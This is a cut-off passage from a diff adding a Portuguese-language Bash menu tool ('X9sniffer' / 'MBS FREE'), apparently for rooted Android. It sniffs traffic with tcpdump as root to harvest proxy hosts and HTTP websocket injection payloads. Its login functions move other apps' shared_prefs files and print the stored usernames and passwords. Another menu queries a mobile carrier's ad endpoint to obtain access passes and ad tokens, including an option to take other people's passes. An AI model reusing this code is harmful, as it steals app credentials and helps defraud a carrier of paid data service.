+}
+logindirect(){
+su -c rm -f login.xml
+clear
+echo -e "\emCOLE O NOME DO PACOTE DO APP${SCOLOR}\em"
+read App
+echo ""
+
+su -c mv /data/data/$App/shared_prefs/"$App"_preferences.xml login.xml
+
+User=$(su -c cat login.xml | grep -a USERNAME | cut -d '>' -f2 | cut -d'<' -f1)
+
+Pass=$(su -c cat login.xml | grep -a PASSWORD | cut -d '>' -f2 | cut -d'<' -f1)
+
+clear
+echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
+echo
+
+echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
+echo -e "${GREEN}$P2${SCOLOR}"
+echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
+echo 
+echo -e "${GREEN}Proxy:$Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Porta${SCOLOR}"
+echo
+echo -e "${GREEN}Usuario: $User${SCOLOR}"
+echo -e "${GREEN}Senha: $Pass${SCOLOR}"
+echo
+echo -e "${DESTACAR}PAYLOAD: ${NADA}"
+echo
+echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
+echo
+
+ read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+
+
+TodasPortas(){
+clear
+su -c rm -f hostcreate.txt
+su -c rm -f proxycriar.txt
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+su -c rm -f proxycreator.txt
+clear
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"
+
+Sniff=$(su -c tcpdump -c55 -n -A)
+echo -e "$Sniff" >> sniffer.txt
+
+Proxycreator=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f5 | grep -a 104)
+echo -e "$Proxycreator" >> proxycreator.txt
+
+clear
+Proxys=$(cat proxycreator.txt | grep -a -n . | grep -a 1: | cut -d':' -f2)
+echo -e "$Proxys" >> proxys.txt
+
+HostCreate=$(cat sniffer.txt | grep -a Host)
+echo -e "$HostCreate" >> hostcreate.txt
+
+P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
+P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7 | grep -a -n . | grep -a 1: | cut -d':' -f2-7)
+P3=$(cat sniffer.txt | grep -a Upgrade)
+Proxy=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4)
+Porta=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 | cut -d ":" -f1)
+check2() {
+    P13=$(cat sniffer.txt | grep -c websocket -i)
+    case $P13 in
+    0) echo "NADA ENCONTRADO" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac;;
+    1) clear;;
+     esac
+}
+check2
+echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
+echo
+
+echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
+echo -e "${GREEN}$P2${SCOLOR}"
+echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
+echo 
+echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Porta${SCOLOR}"
+
+echo
+echo -e "${DESTACAR}PAYLOAD: ${NADA}"
+echo
+
+echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
+
+echo
+read -p "QUER VER OS DETALHES? [Y/n]" optione12
+  case $optione12 in
+  y)cat sniffer.txt ; PegarinfoWSDirect1;;
+  Y)cat sniffer.txt ; PegarinfoWSDirect1;;
+  *)Verlogin2;;
+  esac
+}
+PegarinfoWSDirect1(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoWSDirect2;;
+  Y)PegarinfoWSDirect2;;
+  *)Verlogin2;;
+  esac
+}
+PegarinfoWSDirect2(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+PegarinfoWSDirect3
+}
+PegarinfoWSDirect3(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoWSDirect2;;
+  Y)PegarinfoWSDirect2;;
+  *)Verlogin2;;
+  esac
+}
+Verlogin2(){
+echo
+read -n1 -p "QUER TENTAR CAPTURAR O LOGIN EM ALGUNS APPS [Y/n]" optione1
+  case $optione1 in
+  N)X9sniffer;;
+  n)X9sniffer;;
+  y)logindirect;;
+  Y)logindirect;;
+  *)X9sniffer;;
+  esac
+}
+logindirect(){
+su -c rm -f login.xml
+clear
+echo -e "\emCOLE O NOME DO PACOTE DO APP${SCOLOR}\em"
+read App
+echo ""
+
+su -c mv /data/data/$App/shared_prefs/"$App"_preferences.xml login.xml
+
+User=$(su -c cat login.xml | grep -a USERNAME | cut -d '>' -f2 | cut -d'<' -f1)
+
+Pass=$(su -c cat login.xml | grep -a PASSWORD | cut -d '>' -f2 | cut -d'<' -f1)
+
+clear
+
+echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
+echo -e "${GREEN}$P2${SCOLOR}"
+echo -e "${GREEN}$P3${SCOLOR}"
+echo 
+echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Porta${SCOLOR}"
+echo
+echo -e "${GREEN}Usuario: $User${SCOLOR}"
+echo -e "${GREEN}Senha: $Pass${SCOLOR}"
+echo
+echo -e "${DESTACAR}PAYLOAD: ${NADA}"
+echo
+echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
+echo
+
+ read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+
+
+
+
+wspayssl(){
+clear
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+clear
+Sniffer2
+}
+Sniffer2(){
+clear
+echo -e "NECESSARIO DESATIVAR A OPÇÃO ${GREEN}SSL${SCOLOR}, DEIXAR"
+echo -e "APENAS ${GREEN}PAYLOAD${SCOLOR} ATIVADO E INICIAR A CONEXÃO"
+echo 
+read -n1 -p "DIGITE Y DEPOIS DE TER FEITO TUDO ISSO" optione12
+  case $optione12 in 
+  y)Xaringan;;
+  Y)Xaringan;;
+   *)Sniffer2;;
+  esac
+  }
+Xaringan(){
+clear
+su -c rm -f hostcreate.txt
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+clear
+
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}"
+
+echo 
+
+su -c tcpdump -i any -n -c25 -w sniffer.txt
+
+Proxys=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f5)
+echo -e "$Proxys" >> proxys.txt
+ 
+clear
+HostCreate=$(cat sniffer.txt | grep -a Host)
+echo -e "$HostCreate" >> hostcreate.txt
+P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
+P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7) 
+P3=$(cat sniffer.txt | grep -a Upgrade)
+Proxy=$(cat sniffer.txt | grep -a 104 | cut -d':' -f1 | cut -d' ' -f2)
+Porta=$(cat sniffer.txt | grep -a 104 | cut -d':' -f2 | cut -d' ' -f1)
+P6=$(cat sniffer.txt | grep -a Host | cut -d' ' -f2)
+P22=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7)
+
+check2() {
+    P13=$(cat sniffer.txt | grep -c websocket -i)
+    case $P13 in
+    0) echo "NADA ENCONTRADO NESSA PORTA" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac;;
+    1) clear;;
+     esac
+}
+check2
+
+echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
+echo
+
+echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
+echo -e "${GREEN}$P2${SCOLOR}"
+echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
+echo 
+echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Porta${SCOLOR}"
+echo
+echo -e "${GREEN}SNI: $P6${SCOLOR}"
+echo
+
+read -p "QUER VER OS DETALHES? [Y/n]" optione12
+  case $optione12 in
+  y)cat sniffer.txt ; PegarinfoPaySSL1;;
+  Y)cat sniffer.txt ; PegarinfoPaySSL1;;
+  *)Verlogin3;;
+  esac
+}
+PegarinfoPaySSL1(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoPaySSL2;;
+  Y)PegarinfoPaySSL2;;
+  *)Verlogin3;;
+  esac
+}
+PegarinfoPaySSL2(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+PegarinfoPaySSL3
+}
+PegarinfoPaySSL3(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoPaySSL2;;
+  Y)PegarinfoPaySSL2;;
+  *)Verlogin3;;
+  esac
+}
+Verlogin3(){
+echo
+read -n1 -p "QUER TENTAR CAPTURAR O LOGIN EM ALGUNS APPS [Y/n]" optione1
+  case $optione1 in
+  N)X9sniffer;;
+  n)X9sniffer;;
+  y)login;;
+  Y)login;;
+  *)X9sniffer;;
+  esac
+}
+login(){
+su -c rm -f login.xml
+clear
+echo -e "\emCOLE O NOME DO PACOTE DO APP${SCOLOR}\em"
+read App
+echo ""
+
+su -c mv /data/data/$App/shared_prefs/"$App"_preferences.xml login.xml
+
+User=$(su -c cat login.xml | grep -a USERNAME | cut -d '>' -f2 | cut -d'<' -f1)
+
+Pass=$(su -c cat login.xml | grep -a PASSWORD | cut -d '>' -f2 | cut -d'<' -f1)
+
+clear
+
+echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
+echo -e "${GREEN}$P2${SCOLOR}"
+echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
+echo 
+echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Porta${SCOLOR}"
+echo
+echo -e "${GREEN}Usuario: $User${SCOLOR}"
+echo -e "${GREEN}Senha: $Pass${SCOLOR}"
+echo
+echo -e "${GREEN}SNI: $P6${SCOLOR}"
+echo
+echo -e "${DESTACAR}PAYLOAD: ${NADA}"
+echo
+echo -e "${GREEN}GET / HTTP/1.1[crlf]$P22[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+
+
+
+direct(){
+GREEN='\033[1;32m'
+SCOLOR='\033[0m'
+clear
+Sniffer3
+  }
+Sniffer3(){
+clear
+check7() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
+    0) clear;;
+     esac
+}
+check7
+clear
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+su -c rm -f directproxy.txt
+clear
+su -c rm -f hostdirect.txt
+su -c rm -f directpay.txt
+su -c rm -f directport.txt
+clear
+su -c rm -f directproxycreate.txt
+clear
+echo -e "${DESTACAR}Ex: 80, 443, 8080, 8880, etc ${NADA}"
+echo
+read -p "ESCOLHA UMA PORTA: " Porta
+
+clear
+
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"
+
+sniff=$(su -c tcpdump -c10 -n -A port ${Porta} -vv) && echo -e "$sniff" >> sniffer.txt
+
+HostDir=$(cat sniffer.txt | grep -a Host | cut -d' ' -f2 | grep -a .) && echo -e "$HostDir" >> hostdirect.txt
+
+adr=$(cat hostdirect.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-9)
+
+payloaddd=$(cat sniffer.txt | grep -a "$adr") && echo -e "$payloaddd" >> directpay.txt
+
+directproto=$(cat directpay.txt | grep -a -n "$adr" | cut -d':' -f2-7)
+
+directhost=$(cat directpay.txt | grep -a -n "$adr" | grep -a 2: | cut -d':' -f2-7 | cut -d'	'  -f2)
+
+directproxycreate1=$(cat sniffer.txt | grep -a ">" | cut -d'>' -f2 | cut -d'.' -f1-5 | cut -d':' -f1) && echo -e "$directproxycreate1" >> directproxycreate.txt
+
+directproxycreate2=$(cat directproxycreate.txt | grep -a -n . | grep 1: | cut -d':' -f2) && echo -e "$directproxycreate2" >> directproxy.txt
+
+directproxy=$(cat directproxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4 | grep -a -n . | grep -a 1: | cut -d':' -f2)
+
+directport=$(cat directproxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5)
+
+clear
+check2() {
+    P13=$(cat sniffer.txt | grep -c $directhost)
+    case $P13 in
+    0) echo "NADA ENCONTRADO NESSA PORTA" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac;;
+    1) clear;;
+     esac
+}
+check2
+clear
+echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
+echo
+echo -e "${GREEN}$directproto${SCOLOR}"
+echo 
+echo -e "${GREEN}Servidor:$directproxy${SCOLOR}"
+echo -e "${GREEN}Porta: $directport${SCOLOR}"
+echo
+read -p "QUER VER OS DETALHES? [Y/n]" optione12
+  case $optione12 in
+  y)cat sniffer.txt ; PegarinfoDirect;;
+  Y)cat sniffer.txt ; PegarinfoDirect;;
+  *)Voltar;;
+  esac
+}
+PegarinfoDirect(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoDirect2;;
+  Y)PegarinfoDirect2;;
+  *)Voltar;;
+  esac
+}
+PegarinfoDirect2(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+PegarinfoDirect3
+}
+PegarinfoDirect3(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoDirect2;;
+  Y)PegarinfoDirect2;;
+  *)Voltar;;
+  esac
+}
+Voltar(){
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+
+
+
+V2Ray(){
+clear
+check7() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
+    0) clear;;
+     esac
+}
+check7
+
+echo -e "${DESTACAR}1 - Sniffar porta 80${NADA}"
+echo -e "${DESTACAR}2 - Sniffar porta 443${NADA}"
+echo -e "${DESTACAR}3 - Escolher porta${NADA}"
+echo
+read -n1 -p "Escolha uma Opção: " PortaV2
+case $PortaV2 in
+1)Portv2="80";;
+2)V2Ray443;;
+3)echo ; read -p "Digite a porta: " Portv2;;
+*)V2Ray;;
+esac
+
+clear
+su -c rm -f proxycriar.txt
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+su -c rm -f proxycreator.txt
+su -c rm -f hostcreate.txt
+clear
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"
+
+Sniff=$(su -c tcpdump -c80 -n -A port ${Portv2})
+echo -e "$Sniff" >> sniffer.txt
+
+Proxycreator=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f3 | grep -a 104)
+echo -e "$Proxycreator" >> proxycreator.txt
+
+clear
+Proxys=$(cat proxycreator.txt | grep -a -n . | grep -a 1: | cut -d':' -f2)
+echo -e "$Proxys" >> proxys.txt
+
+HostCreate=$(cat sniffer.txt | grep -a Host)
+echo -e "$HostCreate" >> hostcreate.txt
+
+P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
+P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7 | grep -a -n . | grep -a 1: | cut -d':' -f2-7)
+P3=$(cat sniffer.txt | grep -a Upgrade)
+Proxy=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4)
+Porta=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 | cut -d ":" -f1)
+
+ 
+
+check2() {
+    P13=$(cat sniffer.txt | grep -a -c 104)
+    case $P13 in
+    0) echo "NADA ENCONTRADO" ; sleep 4 ; X9sniffer;;
+    1) clear;;
+     esac
+}
+check2
+echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
+echo
+echo -e "${GREEN}$P2${SCOLOR}"
+echo
+echo -e "${GREEN}Address: $Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Porta${SCOLOR}"
+echo
+read -p "QUER VER OS DETALHES? [Y/n]" optione12
+  case $optione12 in
+  y)cat sniffer.txt ; Pegarinfo;;
+  Y)cat sniffer.txt ; Pegarinfo;;
+  *)Voltar;;
+  esac
+}
+Pegarinfo(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)Pegarinfo2;;
+  Y)Pegarinfo2;;
+  *)Voltar;;
+  esac
+}
+Pegarinfo2(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+PegarinfoRev
+}
+PegarinfoRev(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)Pegarinfo2;;
+  Y)Pegarinfo2;;
+  *)Voltar;;
+  esac
+}
+Voltar(){
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+
+V2Ray443(){
+clear
+su -c rm -f proxycriar.txt
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+su -c rm -f proxycreator.txt
+su -c rm -f hostcreate.txt
+clear
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"
+
+Sniff=$(su -c tcpdump -c80 -n -A port 443)
+echo -e "$Sniff" >> sniffer.txt
+
+Proxycreator=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f3 | grep -a 104)
+echo -e "$Proxycreator" >> proxycreator.txt
+
+clear
+Proxys=$(cat proxycreator.txt | grep -a -n . | grep -a 1: | cut -d':' -f2)
+echo -e "$Proxys" >> proxys.txt
+
+HostCreate=$(cat sniffer.txt | grep -a Host)
+echo -e "$HostCreate" >> hostcreate.txt
+
+P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
+P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7 | grep -a -n . | grep -a 1: | cut -d':' -f2-7)
+P3=$(cat sniffer.txt | grep -a Upgrade)
+Proxy=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4)
+Porta=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 | cut -d ":" -f1)
+
+ 
+
+check2() {
+    P13=$(cat sniffer.txt | grep -c 104)
+    case $P13 in
+    0) echo "NADA ENCONTRADO" ; sleep 4 ; X9sniffer;;
+    1) clear;;
+     esac
+}
+check2
+echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
+echo
+echo -e "${GREEN}Address: $Proxy${SCOLOR}"
+echo -e "${GREEN}Porta: $Porta${SCOLOR}"
+echo
+read -p "QUER VER OS DETALHES? [Y/n]" optione12
+  case $optione12 in
+  y)cat sniffer.txt ; Pegarinfo;;
+  Y)cat sniffer.txt ; Pegarinfo;;
+  *)Voltar;;
+  esac
+}
+Pegarinfo(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)Pegarinfo2;;
+  Y)Pegarinfo2;;
+  *)Voltar;;
+  esac
+}
+Pegarinfo2(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+PegarinfoRev
+}
+PegarinfoRev(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)Pegarinfo2;;
+  Y)Pegarinfo2;;
+  *)Voltar;;
+  esac
+}
+Voltar(){
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+
+
+SniffarAll(){
+clear
+check7() {
+    vpn=$(ifconfig | grep -c tun0)
+    case $vpn in
+    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
+    0) clear;;
+     esac
+}
+check7
+clear
+
+echo -e "${DESTACAR}1 - Escolher Porta${NADA}"
+echo -e "${DESTACAR}2 - Todas as Portas${NADA}"
+echo
+read -n1 -p "Escolha uma Opção: " ComSemPorta
+case $ComSemPorta in
+1)ComPortaAll;;
+2)TodasPortasAll;;
+*)SniffarAll;;
+esac
+}
+
+ComPortaAll(){
+clear
+su -c rm -f proxycriar.txt
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+su -c rm -f proxy.txt
+clear
+echo -e "${DESTACAR}Ex: 80, 443, 8080, 8880, etc ${NADA}"
+echo
+read -p "ESCOLHA UMA PORTA: " Porta
+
+clear
+
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo -e "${DESTACAR}PARA PARAR DIGITE${NADA} ${GREEN}CTRL+C${NADA}"
+
+Sniff=$(su -c tcpdump -c10000 port ${Porta} -n -A)
+echo -e "$Sniff" >> sniffer.txt
+cat sniffer.txt
+
+
+PegarinfoAll
+}
+PegarinfoAll(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoAll2;;
+  Y)PegarinfoAll2;;
+  *)Voltar;;
+  esac
+}
+PegarinfoAll2(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+PegarinfoAll3
+}
+PegarinfoAll3(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)PegarinfoAll2;;
+  Y)PegarinfoAll2;;
+  *)Voltar;;
+  esac
+}
+Voltar(){
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+TodasPortasAll(){
+clear
+su -c rm -f proxycriar.txt
+su -c rm -f sniffer.txt
+su -c rm -f proxys.txt
+su -c rm -f proxy.txt
+
+clear
+
+echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo -e "${DESTACAR}PARA PARAR DIGITE${NADA} ${GREEN}CTRL+C${NADA}"
+
+Sniff=$(su -c tcpdump -c10000 -A)
+echo -e "$Sniff" >> sniffer.txt
+cat sniffer.txt
+
+
+Pegarinfo2All
+}
+Pegarinfo2All(){
+echo
+  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)Pegarinfo2All2;;
+  Y)Pegarinfo2All2;;
+  *)Voltar;;
+  esac
+}
+Pegarinfo2All2(){
+read -p "DIGITE O QUE QUER PROCURAR: " info
+case $info in
+esac
+echo
+cat sniffer.txt | grep -a -i "$info"
+Pegarinfo2All3
+}
+Pegarinfo2All3(){
+echo
+  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
+  y)Pegarinfo2All2;;
+  Y)Pegarinfo2All2;;
+  *)Voltar;;
+  esac
+}
+Voltar(){
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)X9sniffer;;
+  esac
+}
+
+
+
+
+
+
+Menu5(){
+rm -f chavedeacesso.txt
+clear
+echo -e '\n'
+echo "     ==================================="
+echo "                    MBS FREE     "
+echo "         ===================================" 
+echo "                ESCOLHA UMA OPÇÃO"
+echo
+echo "        ==================================="
+echo -e "              ${DESTACAR}[ 1 ] - Procurar Pass"
+echo -e "              [ 2 ] - Usar Pass Personalizado"
+echo -e "              [ 3 ] - Usar Pass Salvos"
+echo -e "              [ 4 ] - Pegar Pass de Outras Pessoas"
+echo -e "              [ 0 ] - Voltar${NADA}"
+echo "         ==================================="
+echo 
+echo "@alpacinoo007"
+echo "@luanw04"
+echo
+read -n1 -p "ESCOLHA UMA OPÇÃO: " TokensNews01
+case $TokensNews01 in
+1)ProcurarAPass ;;
+2)chavecustom ;;
+3)PassSalvos0;;
+4)ComoPegarOPass;;
+0)MenuPrincipal;;
+*)Menu5;;
+esac
+}
+
+ProcurarAPass(){
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+
+echo -e "============================================${NADA}"
+
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+
+echo -e "============================================${NADA}"
+
+echo -e "${RED}DESLIGUE O WI-FI, PARE A VPN E LIGUE OS DADOS "
+echo -e "MOVEIS${NADA}${DESTACAR} PARA O SCRIPT GERAR O ${GREEN}PASS${DESTACAR} E CAPTURAR OS"
+echo -e "TOKENS DE ADS QUE ESTÃO ATIVOS NA SUA LINHA"
+
+echo
+
+echo -e "DIGITE ${GREEN}Y${DESTACAR} DEPOIS DE TER FEITO TUDO ${NADA}"
+
+ read -n1 Option005
+ case $Option005 in
+ Y);;
+ y);;
+ *)Menu5;;
+ esac
+ 
+ 
+
+AccessPass=$(curl -s -d "pageId=660224&version=2" i.vivo.ddivulga.com/i/gp | cut -d'"' -f4)
+echo -e "$AccessPass" >> chavedeacesso.txt
+
+
+clear
+echo -e "============================================${NADA}"
+
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+
+echo -e "============================================${NADA}"
+echo -e "${DESTACAR}JÁ PODE SE CONECTAR EM VPNS OU WIFI SE QUISER"
+echo
+read -n1 -p $'APERTE QUALQUER TECLA APÓS SE CONECTAR' conectadoain
+case $conectadoain in
+*)Buscartokens;;
+esac
+}
+
+chavecustom(){
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+echo -e "============================================${NADA}"
+
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+
+echo -e "============================================${NADA}"
+read -p $'\e[01;37mCOLE O PASS: \033[1;32m' AccessPass
+echo
+SalvarPass
+}
+
+SalvarPass(){
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+echo -e "${NADA}============================================${NADA}"
+
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+
+echo -e "============================================${NADA}"
+read -p $'\e[01;37mQUER SALVAR ESSE PASS? [Y/n] ' AccessPassSave
+echo
+case $AccessPassSave in
+n)Buscartokens;;
+N)Buscartokens;;
+Y)read -p $'\e[01;37mDIGITE UM NOME PARA O PASS: ' PassName ; echo -e " ${GREEN} $PassName${NADA}-$AccessPass" >> TokensSave.txt ; Buscartokens;;
+y)read -p $'\e[01;37mDIGITE UM NOME PARA O PASS: ' PassName ; echo -e "${GREEN} $PassName${NADA}-$AccessPass" >> TokensSave.txt ; Buscartokens;;
+*)SalvarPass;;
+esac
+}
+
+Buscartokens(){
+NADA='\033[0m'
+CINZA='\e[02;37m'
+DESTACAR='\e[01;37m'
+SCOLOR='\033[0m'
+echo
+rm -f advmensagem.txt
+rm -f advreward.txt
+rm -f advrewardcriar.txt
+rm -f advnamecriar.txt
+rm -f advname.txt
+rm -f TestesFeitos.txt
+rm -f TokensEncontrados.txt
+rm -f tokencreator.txt
+rm -f impressionid.txt
+rm -f tokencreator2.txt
+rm -f advid.txt
+rm -f advidcriar.txt
+rm -f impressionid.txt
+rm -f impressionidcriar.txt
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+echo -e "${NADA}============================================${NADA}"
+
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+
+echo -e "============================================${NADA}"
+echo -e "${DESTACAR}PROCURANDO TOKENS...${NADA}"
+
+ 
+
